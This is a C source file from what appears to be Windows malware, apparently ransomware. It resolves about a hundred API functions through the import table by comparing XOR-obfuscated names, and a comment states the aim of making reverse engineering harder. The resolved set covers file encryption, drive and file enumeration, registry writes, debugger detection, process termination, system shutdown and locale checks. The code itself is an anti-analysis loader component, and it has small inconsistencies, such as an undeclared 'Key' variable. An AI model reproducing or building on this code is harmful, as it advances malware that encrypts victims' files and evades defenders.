#include "WindowsIAT.h"
#include "strings.h"
#define __TOLOWER(c) ((((c) >= 'A') && ((c) <= 'Z'))? ((c) | 0x20): (c))
#define __TOUPPER(c) ((((c) >= 'a') && ((c) <= 'z'))? ((c) & ~0x20): (c))
extern VOID LadonZeroMemory(LPVOID lpvBuffer, DWORD dwSize);



unsigned char LoaderObfuscationKey[] = "O468L";

MessageBoxAFunc _MessageBoxA = NULL;
MessageBoxWFunc _MessageBoxW = NULL;
GetKeyboardLayoutFunc _GetKeyboardLayout = NULL;
SystemParametersInfoAFunc _SystemParametersInfoA = NULL;
SystemParametersInfoWFunc _SystemParametersInfoW = NULL;
wsprintfAFunc _wsprintfA = NULL;
wsprintfWFunc _wsprintfW = NULL;
SHGetFolderPathAFunc _SHGetFolderPathA = NULL;
SHGetFolderPathWFunc _SHGetFolderPathW = NULL;
CryptAcquireContextAFunc _CryptAcquireContextA = NULL;
CryptAcquireContextWFunc _CryptAcquireContextW = NULL;
CryptReleaseContextFunc _CryptReleaseContext = NULL;
CryptGenKeyFunc _CryptGenKey = NULL;
RegDeleteKeyValueAFunc _RegDeleteKeyValueA = NULL;
RegDeleteKeyValueWFunc _RegDeleteKeyValueW = NULL;
RegSetValueExAFunc _RegSetValueExA = NULL;
RegSetValueExWFunc _RegSetValueExW = NULL;
RegCloseKeyFunc _RegCloseKey = NULL;
GetCurrentHwProfileAFunc _GetCurrentHwProfileA = NULL;
GetCurrentHwProfileWFunc _GetCurrentHwProfileW = NULL;
CryptDecryptFunc _CryptDecrypt = NULL;
CryptEncryptFunc _CryptEncrypt = NULL;
CryptImportKeyFunc _CryptImportKey = NULL;
CryptExportKeyFunc _CryptExportKey = NULL;
CryptDestroyKeyFunc _CryptDestroyKey = NULL;
InitiateSystemShutdownExAFunc _InitiateSystemShutdownExA = NULL;
InitiateSystemShutdownExWFunc _InitiateSystemShutdownExW = NULL;

CreateFileAFunc _CreateFileA = NULL;
CreateFileWFunc _CreateFileW = NULL;
IsDebuggerPresentFunc _IsDebuggerPresent = NULL;
CloseHandleFunc _CloseHandle = NULL;
HeapAllocFunc _HeapAlloc = NULL;
HeapFreeFunc _HeapFree = NULL;
GetCurrentThreadFunc _GetCurrentThread = NULL;
GetThreadContextFunc _GetThreadContext = NULL;

SleepFunc _Sleep = NULL;
TerminateProcessFunc _TerminateProcess = NULL;
GetExitCodeProcessFunc _GetExitCodeProcess = NULL;

OpenProcessFunc _OpenProcess = NULL;
FreeLibraryFunc _FreeLibrary = NULL;

GetProcAddressFunc _GetProcAddress = NULL;
LoadLibraryAFunc _LoadLibraryA = NULL;
LoadLibraryWFunc _LoadLibraryW = NULL;
CopyFileAFunc _CopyFileA = NULL;
CopyFileWFunc _CopyFileW = NULL;
CreateToolhelp32SnapshotFunc _CreateToolhelp32Snapshot = NULL;
Process32FirstFunc _Process32First = NULL;
Process32FirstWFunc _Process32FirstW = NULL;
Process32NextFunc _Process32Next = NULL;
Process32NextWFunc _Process32NextW = NULL;
GetFileSizeExFunc _GetFileSizeEx = NULL;
ReadFileFunc _ReadFile = NULL;
SetEndOfFileFunc _SetEndOfFile = NULL;
SetFilePointerFunc _SetFilePointer = NULL;
SetFilePointerExFunc _SetFilePointerEx = NULL;
WriteFileFunc _WriteFile = NULL;
GetLastErrorFunc _GetLastError = NULL;
GetProcessHeapFunc _GetProcessHeap = NULL;
LocalFreeFunc _LocalFree = NULL;
MoveFileAFunc _MoveFileA = NULL;
MoveFileWFunc _MoveFileW = NULL;
HeapReAllocFunc _HeapReAlloc = NULL;
FindCloseFunc _FindClose = NULL;
FindFirstFileAFunc _FindFirstFileA = NULL;
FindFirstFileWFunc _FindFirstFileW = NULL;
FindNextFileAFunc _FindNextFileA = NULL;
FindNextFileWFunc _FindNextFileW = NULL;
GetLogicalDriveStringsAFunc _GetLogicalDriveStringsA = NULL;
GetLogicalDriveStringsWFunc _GetLogicalDriveStringsW = NULL;
lstrcmpAFunc _lstrcmpA = NULL;
lstrcmpWFunc _lstrcmpW = NULL;
MultiByteToWideCharFunc _MultiByteToWideChar = NULL;
ExitProcessFunc _ExitProcess = NULL;
GetUserDefaultLCIDFunc _GetUserDefaultLCID = NULL;

lstrlenAFunc _lstrlenA = NULL;
lstrlenWFunc _lstrlenW = NULL;
CreateProcessAFunc _CreateProcessA = NULL;
CreateProcessWFunc _CreateProcessW = NULL;
WaitForSingleObjectFunc _WaitForSingleObject = NULL;
GetModuleFileNameAFunc _GetModuleFileNameA = NULL;
GetModuleFileNameWFunc _GetModuleFileNameW = NULL;
RegCreateKeyExAFunc _RegCreateKeyExA = NULL;
RegCreateKeyExWFunc _RegCreateKeyExW = NULL;
CryptDecodeObjectExFunc _CryptDecodeObjectEx = NULL;
CryptImportPublicKeyInfoFunc _CryptImportPublicKeyInfo = NULL;
CryptStringToBinaryAFunc _CryptStringToBinaryA = NULL;
CryptStringToBinaryWFunc _CryptStringToBinaryW = NULL;
PathFindExtensionAFunc _PathFindExtensionA = NULL;
PathFindExtensionWFunc _PathFindExtensionW = NULL;
InternetSetCookieAFunc _InternetSetCookieA = NULL;
InternetSetCookieWFunc _InternetSetCookieW = NULL;
InternetReadFileFunc _InternetReadFile = NULL;
InternetOpenUrlAFunc _InternetOpenUrlA = NULL;
InternetOpenUrlWFunc _InternetOpenUrlW = NULL;
InternetCloseHandleFunc _InternetCloseHandle = NULL;
InternetOpenAFunc _InternetOpenA = NULL;
InternetOpenWFunc _InternetOpenW = NULL;

int __CmpStr(unsigned char* lpszStr1, unsigned char* lpszStr2)
{
	for (; *lpszStr1 != '\0'; lpszStr1++, lpszStr2++)
	{
		if (*lpszStr1 != *lpszStr2)
			break;
	}

	return *lpszStr1 - *lpszStr2;
}

int __CmpStrI(LPCSTR lpszStr1, LPCSTR lpszStr2)
{
	for (; *lpszStr1 != '\0'; lpszStr1++, lpszStr2++)
	{
		CHAR cChar1 = *lpszStr1, cChar2 = *lpszStr2;

		if (__TOLOWER(cChar1) != __TOLOWER(cChar2))
		{
			return (int)cChar1 - (int)cChar2;
		}
	}

	return (int)*lpszStr1 - (int)*lpszStr2;
}






void XorEncrypt(const char *in, const char *key, char *out)
{
	char *lookup = "0123456789ABCDEF";
	const unsigned int keyLength = strlen(key);
	char tc;
	int i = 0;

	for (; in[i] != '\0'; i++)
	{
		tc = in[i] ^ key[i % keyLength];
		out[i * 2] = lookup[(tc >> 4) & 0xf];
		out[i * 2 + 1] = lookup[tc & 0xf];
	}

	out[i * 2] = '\0';
}
// encryption
unsigned int
zstrlen(char *str)
{
	if (!str) {
		return 0;
	}

	char *ptr = str;
	while (*str) {
		++str;
	}

	return str - ptr;
}
void * zmecpy(void *dst, const void *src, size_t n)
{
	void           *res = dst;
	unsigned char  *c1, *c2;

	c1 = (unsigned char *)dst;
	c2 = (unsigned char *)src;
	while (n--) *c1++ = *c2++;
	return (res);
}
int iwas;

BOOL GetFuncAddr(PVOID pvBaseAddr, LPCSTR lpszModuleName,
	LPCSTR lpszFuncName, LPVOID *lpvFuncAddr)
{
	ULONG ulEntrySize = 0;
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pvBaseAddr;
	PIMAGE_NT_HEADERS pNTHeader = (PIMAGE_NT_HEADERS)
		((PCHAR)pDosHeader + pDosHeader->e_lfanew);
	PIMAGE_DATA_DIRECTORY pIDD = &pNTHeader->OptionalHeader.DataDirectory[1];
	PIMAGE_IMPORT_DESCRIPTOR pIID = (PIMAGE_IMPORT_DESCRIPTOR)
		((PCHAR)pDosHeader + pIDD->VirtualAddress);
	PIMAGE_THUNK_DATA pOriginalITD = NULL, pITD = NULL;
	iwas++;
	PIMAGE_IMPORT_BY_NAME pIIBN = NULL;

	for (; pIID->Name; pIID++)
	{
		LPCSTR lpszModuleEntryName = ((PCHAR)pvBaseAddr) + pIID->Name;

		if (!__CmpStrI(lpszModuleEntryName, lpszModuleName))
		{
			pOriginalITD = (PIMAGE_THUNK_DATA)(((PCHAR)pvBaseAddr) + pIID->OriginalFirstThunk);
			pITD = (PIMAGE_THUNK_DATA)(((PCHAR)pvBaseAddr) + pIID->FirstThunk);

			for (; pOriginalITD->u1.Function; pITD++, pOriginalITD++)
			{
				if (!((DWORD)pOriginalITD->u1.Function & 0x80000000))
				{
					pIIBN = (PIMAGE_IMPORT_BY_NAME)(((PCHAR)pvBaseAddr)
						+ (DWORD)pOriginalITD->u1.AddressOfData);
					int size = zstrlen(pIIBN->Name);

					unsigned char *encStr = HeapAlloc(GetProcessHeap(), 0, size * 2 + 1);
					XorEncrypt(pIIBN->Name, Key, encStr);

					if (!__CmpStr((LPCSTR)encStr, lpszFuncName))
					{
						*((PDWORD *)lpvFuncAddr) = (PDWORD)pITD->u1.Function;

						HeapFree(GetProcessHeap(), 0, encStr);
						return TRUE;
					}
					HeapFree(GetProcessHeap(), 0, encStr);
				}
			}
		}
	}
	char wow[MAX_PATH];
	wsprintf(wow, "%d", iwas);
	MessageBox(0, wow, "Failed", 0);

	return FALSE;
}

BOOL LoadIATFuncs(LPVOID lpvBaseAddr)
{
	/* TODO: switch to hashing to make RE much more difficult */
	return (GetFuncAddr(lpvBaseAddr, user32_dll_w, MessageBoxAEncrypted, (LPVOID *)&_MessageBoxA)
		&& GetFuncAddr(lpvBaseAddr, user32_dll_w, MessageBoxWEncrypted, (LPVOID *)&_MessageBoxW)
		&& GetFuncAddr(lpvBaseAddr, user32_dll_w, GetKeyboardLayoutEncrypted, (LPVOID *)&_GetKeyboardLayout)
		&& GetFuncAddr(lpvBaseAddr, user32_dll_w, SystemParametersInfoAEncrypted, (LPVOID *)&_SystemParametersInfoA)
		&& GetFuncAddr(lpvBaseAddr, user32_dll_w, SystemParametersInfoWEncrypted, (LPVOID *)&_SystemParametersInfoW)
		&& GetFuncAddr(lpvBaseAddr, user32_dll_w, wsprintfAEncrypted, (LPVOID *)&_wsprintfA)
		&& GetFuncAddr(lpvBaseAddr, user32_dll_w, wsprintfWEncrypted, (LPVOID *)&_wsprintfW)

		&& GetFuncAddr(lpvBaseAddr, shell32_dll_w, SHGetFolderPathAEncrypted, (LPVOID *)&_SHGetFolderPathA)
		&& GetFuncAddr(lpvBaseAddr, shell32_dll_w, SHGetFolderPathWEncrypted, (LPVOID *)&_SHGetFolderPathW)

		&& GetFuncAddr(lpvBaseAddr, advapi32_dll_w, CryptAcquireContextAEncrypted, (LPVOID *)&_CryptAcquireContextA)
		&& GetFuncAddr(lpvBaseAddr, advapi32_dll_w, CryptAcquireContextWEncrypted, (LPVOID *)&_CryptAcquireContextW)
		&& GetFuncAddr(lpvBaseAddr, advapi32_dll_w, CryptReleaseContextEncrypted, (LPVOID *)&_CryptReleaseContext)
		&& GetFuncAddr(lpvBaseAddr, advapi32_dll_w, CryptGenKeyEncrypted, (LPVOID *)&_CryptGenKey)
		&& GetFuncAddr(lpvBaseAddr, advapi32_dll_w, RegDeleteKeyValueAEncrypted, (LPVOID *)&_RegDeleteKeyValueA)
		&& GetFuncAddr(lpvBaseAddr, advapi32_dll_w, RegDeleteKeyValueWEncrypted, (LPVOID *)&_RegDeleteKeyValueW)
		&& GetFuncAddr(lpvBaseAddr, advapi32_dll_w, RegSetValueExAEncrypted, (LPVOID *)&_RegSetValueExA)
		&& GetFuncAddr(lpvBaseAddr, advapi32_dll_w, RegSetValueExWEncrypted, (LPVOID *)&_RegSetValueExW)
		&& GetFuncAddr(lpvBaseAddr, advapi32_dll_w, RegCloseKeyEncrypted, (LPVOID *)&_RegCloseKey)
		&& GetFuncAddr(lpvBaseAddr, advapi32_dll_w, GetCurrentHwProfileAEncrypted, (LPVOID *)&_GetCurrentHwProfileA)
		&& GetFuncAddr(lpvBaseAddr, advapi32_dll_w, GetCurrentHwProfileWEncrypted, (LPVOID *)&_GetCurrentHwProfileW)
		&& GetFuncAddr(lpvBaseAddr, advapi32_dll_w, CryptDecryptEncrypted, (LPVOID *)&_CryptDecrypt)
		&& GetFuncAddr(lpvBaseAddr, advapi32_dll_w, CryptEncryptEncrypted, (LPVOID *)&_CryptEncrypt)
		&& GetFuncAddr(lpvBaseAddr, advapi32_dll_w, CryptImportKeyEncrypted, (LPVOID *)&_CryptImportKey)
		&& GetFuncAddr(lpvBaseAddr, advapi32_dll_w, CryptExportKeyEncrypted, (LPVOID *)&_CryptExportKey)
		&& GetFuncAddr(lpvBaseAddr, advapi32_dll_w, CryptDestroyKeyEncrypted, (LPVOID *)&_CryptDestroyKey)
		&& GetFuncAddr(lpvBaseAddr, advapi32_dll_w, InitiateSystemShutdownExAEncrypted, (LPVOID *)&_InitiateSystemShutdownExA)
		&& GetFuncAddr(lpvBaseAddr, advapi32_dll_w, InitiateSystemShutdownExWEncrypted, (LPVOID *)&_InitiateSystemShutdownExW)

		&& GetFuncAddr(lpvBaseAddr, advapi32_dll_w, RegCreateKeyExAEncrypted, (LPVOID *)&_RegCreateKeyExA)
		&& GetFuncAddr(lpvBaseAddr, advapi32_dll_w, RegCreateKeyExWEncrypted, (LPVOID *)&_RegCreateKeyExW)

		//&& GetFuncAddr(lpvBaseAddr, kernel32_dll_w, OpenProcessEncrypted, (LPVOID *)&_OpenProcess)
		&& GetFuncAddr(lpvBaseAddr, kernel32_dll_w, CreateFileWEncrypted, (LPVOID *)&_CreateFileW)
		&& GetFuncAddr(lpvBaseAddr, kernel32_dll_w, IsDebuggerPresentEncrypted, (LPVOID *)&_IsDebuggerPresent)
		&& GetFuncAddr(lpvBaseAddr, kernel32_dll_w, CloseHandleEncrypted, (LPVOID *)&_CloseHandle)
		&& GetFuncAddr(lpvBaseAddr, kernel32_dll_w, HeapAllocEncrypted, (LPVOID *)&_HeapAlloc)
		&& GetFuncAddr(lpvBaseAddr, kernel32_dll_w, HeapFreeEncrypted, (LPVOID *)&_HeapFree)

		&& GetFuncAddr(lpvBaseAddr, kernel32_dll_w, SleepEncrypted, (LPVOID *)&_Sleep)
		&& GetFuncAddr(lpvBaseAddr, kernel32_dll_w, TerminateProcessEncrypted, (LPVOID *)&_TerminateProcess)
		&& GetFuncAddr(lpvBaseAddr, kernel32_dll_w, GetExitCodeProcessEncrypted, (LPVOID *)&_GetExitCodeProcess)

		&& GetFuncAddr(lpvBaseAddr, kernel32_dll_w, GetCurrentThreadEncrypted, (LPVOID *)&_GetCurrentThread)
		&& GetFuncAddr(lpvBaseAddr, kernel32_dll_w, GetThreadContextEncrypted, (LPVOID *)&_GetThreadContext)
		&& GetFuncAddr(lpvBaseAddr, kernel32_dll_w, GetProcAddressEncrypted, (LPVOID *)&_GetProcAddress)
		&& GetFuncAddr(lpvBaseAddr, kernel32_dll_w, LoadLibraryAEncrypted, (LPVOID *)&_LoadLibraryA)
		&& GetFuncAddr(lpvBaseAddr, kernel32_dll_w, LoadLibraryWEncrypted, (LPVOID *)&_LoadLibraryW)
		&& GetFuncAddr(lpvBaseAddr, kernel32_dll_w, CopyFileAEncrypted, (LPVOID *)&_CopyFileA)
		&& GetFuncAddr(lpvBaseAddr, kernel32_dll_w, CopyFileWEncrypted, (LPVOID *)&_CopyFileW)
		&& GetFuncAddr(lpvBaseAddr, kernel32_dll_w, CreateToolhelp32SnapshotEncrypted, (LPVOID *)&_CreateToolhelp32Snapshot)
		&& GetFuncAddr(lpvBaseAddr, kernel32_dll_w, Process32FirstEncrypted, (LPVOID *)&_Process32First)
		&& GetFuncAddr(lpvBaseAddr, kernel32_dll_w, Process32FirstWEncrypted, (LPVOID *)&_Process32FirstW)
		&& GetFuncAddr(lpvBaseAddr, kernel32_dll_w, Process32NextEncrypted, (LPVOID *)&_Process32Next)
		&& GetFuncAddr(lpvBaseAddr, kernel32_dll_w, Process32NextWEncrypted, (LPVOID *)&_Process32NextW)
		&& GetFuncAddr(lpvBaseAddr, kernel32_dll_w, GetFileSizeExEncrypted, (LPVOID *)&_GetFileSizeEx)
		&& GetFuncAddr(lpvBaseAddr, kernel32_dll_w, ReadFileEncrypted, (LPVOID *)&_ReadFile)
		&& GetFuncAddr(lpvBaseAddr, kernel32_dll_w, SetEndOfFileEncrypted, (LPVOID *)&_SetEndOfFile)
		&& GetFuncAddr(lpvBaseAddr, kernel32_dll_w, SetFilePointerEncrypted, (LPVOID *)&_SetFilePointer)
		&& GetFuncAddr(lpvBaseAddr, kernel32_dll_w, SetFilePointerExEncrypted, (LPVOID *)&_SetFilePointerEx)
		&& GetFuncAddr(lpvBaseAddr, kernel32_dll_w, WriteFileEncrypted, (LPVOID *)&_WriteFile)
		&& GetFuncAddr(lpvBaseAddr, kernel32_dll_w, GetLastErrorEncrypted, (LPVOID *)&_GetLastError)
		&& GetFuncAddr(lpvBaseAddr, kernel32_dll_w, GetProcessHeapEncrypted, (LPVOID *)&_GetProcessHeap)
		&& GetFuncAddr(lpvBaseAddr, kernel32_dll_w, LocalFreeEncrypted, (LPVOID *)&_LocalFree)
		&& GetFuncAddr(lpvBaseAddr, kernel32_dll_w, MoveFileAEncrypted, (LPVOID *)&_MoveFileA)
		&& GetFuncAddr(lpvBaseAddr, kernel32_dll_w, MoveFileWEncrypted, (LPVOID *)&_MoveFileW)
		&& GetFuncAddr(lpvBaseAddr, kernel32_dll_w, HeapReAllocEncrypted, (LPVOID *)&_HeapReAlloc)
		&& GetFuncAddr(lpvBaseAddr, kernel32_dll_w, FindCloseEncrypted, (LPVOID *)&_FindClose)
		&& GetFuncAddr(lpvBaseAddr, kernel32_dll_w, FindFirstFileAEncrypted, (LPVOID *)&_FindFirstFileA)
		&& GetFuncAddr(lpvBaseAddr, kernel32_dll_w, FindFirstFileWEncrypted, (LPVOID *)&_FindFirstFileW)
		&& GetFuncAddr(lpvBaseAddr, kernel32_dll_w, FindNextFileAEncrypted, (LPVOID *)&_FindNextFileA)
		&& GetFuncAddr(lpvBaseAddr, kernel32_dll_w, FindNextFileWEncrypted, (LPVOID *)&_FindNextFileW)
		&& GetFuncAddr(lpvBaseAddr, kernel32_dll_w, GetLogicalDriveStringsAEncrypted, (LPVOID *)&_GetLogicalDriveStringsA)
		&& GetFuncAddr(lpvBaseAddr, kernel32_dll_w, GetLogicalDriveStringsWEncrypted, (LPVOID *)&_GetLogicalDriveStringsW)

		&& GetFuncAddr(lpvBaseAddr, kernel32_dll_w, lstrcmpAEncrypted, (LPVOID *)&_lstrcmpA)
		&& GetFuncAddr(lpvBaseAddr, kernel32_dll_w, lstrcmpWEncrypted, (LPVOID *)&_lstrcmpW)
		&& GetFuncAddr(lpvBaseAddr, kernel32_dll_w, MultiByteToWideCharEncrypted, (LPVOID *)&_MultiByteToWideChar)
		&& GetFuncAddr(lpvBaseAddr, kernel32_dll_w, ExitProcessEncrypted, (LPVOID *)&_ExitProcess)
		&& GetFuncAddr(lpvBaseAddr, kernel32_dll_w, GetUserDefaultLCIDEncrypted, (LPVOID *)&_GetUserDefaultLCID)

		&& GetFuncAddr(lpvBaseAddr, kernel32_dll_w, lstrlenAEncrypted, (LPVOID *)&_lstrlenA)
		&& GetFuncAddr(lpvBaseAddr, kernel32_dll_w, lstrlenWEncrypted, (LPVOID *)&_lstrlenW)
		&& GetFuncAddr(lpvBaseAddr, kernel32_dll_w, CreateProcessAEncrypted, (LPVOID *)&_CreateProcessA)
		&& GetFuncAddr(lpvBaseAddr, kernel32_dll_w, CreateProcessWEncrypted, (LPVOID *)&_CreateProcessW)
		&& GetFuncAddr(lpvBaseAddr, kernel32_dll_w, WaitForSingleObjectEncrypted, (LPVOID *)&_WaitForSingleObject)
		&& GetFuncAddr(lpvBaseAddr, kernel32_dll_w, GetModuleFileNameAEncrypted, (LPVOID *)&_GetModuleFileNameA)
		&& GetFuncAddr(lpvBaseAddr, kernel32_dll_w, GetModuleFileNameWEncrypted, (LPVOID *)&_GetModuleFileNameW)

		&& GetFuncAddr(lpvBaseAddr, crypt32_dll_w, CryptDecodeObjectExEncrypted, (LPVOID *)&_CryptDecodeObjectEx)
		&& GetFuncAddr(lpvBaseAddr, crypt32_dll_w, CryptImportPublicKeyInfoEncrypted, (LPVOID *)&_CryptImportPublicKeyInfo)
		&& GetFuncAddr(lpvBaseAddr, crypt32_dll_w, CryptStringToBinaryAEncrypted, (LPVOID *)&_CryptStringToBinaryA)
		&& GetFuncAddr(lpvBaseAddr, crypt32_dll_w, CryptStringToBinaryWEncrypted, (LPVOID *)&_CryptStringToBinaryW)


		&& GetFuncAddr(lpvBaseAddr, shlwapi_dll_w, PathFindExtensionAEncrypted, (LPVOID *)&_PathFindExtensionA)
		&& GetFuncAddr(lpvBaseAddr, shlwapi_dll_w, PathFindExtensionWEncrypted, (LPVOID *)&_PathFindExtensionW)

		&& GetFuncAddr(lpvBaseAddr, wininet_dll_w, InternetSetCookieAEncrypted, (LPVOID *)&_InternetSetCookieA)
		&& GetFuncAddr(lpvBaseAddr, wininet_dll_w, InternetSetCookieWEncrypted, (LPVOID *)&_InternetSetCookieW)
		&& GetFuncAddr(lpvBaseAddr, wininet_dll_w, InternetReadFileEncrypted, (LPVOID *)&_InternetReadFile)
		&& GetFuncAddr(lpvBaseAddr, wininet_dll_w, InternetOpenUrlAEncrypted, (LPVOID *)&_InternetOpenUrlA)
		&& GetFuncAddr(lpvBaseAddr, wininet_dll_w, InternetOpenUrlWEncrypted, (LPVOID *)&_InternetOpenUrlW)
		&& GetFuncAddr(lpvBaseAddr, wininet_dll_w, InternetCloseHandleEncrypted, (LPVOID *)&_InternetCloseHandle)
		&& GetFuncAddr(lpvBaseAddr, wininet_dll_w, InternetOpenAEncrypted, (LPVOID *)&_InternetOpenA)
		&& GetFuncAddr(lpvBaseAddr, wininet_dll_w, InternetOpenWEncrypted, (LPVOID *)&_InternetOpenW));
}

void UnloadIATFuncs()
{

}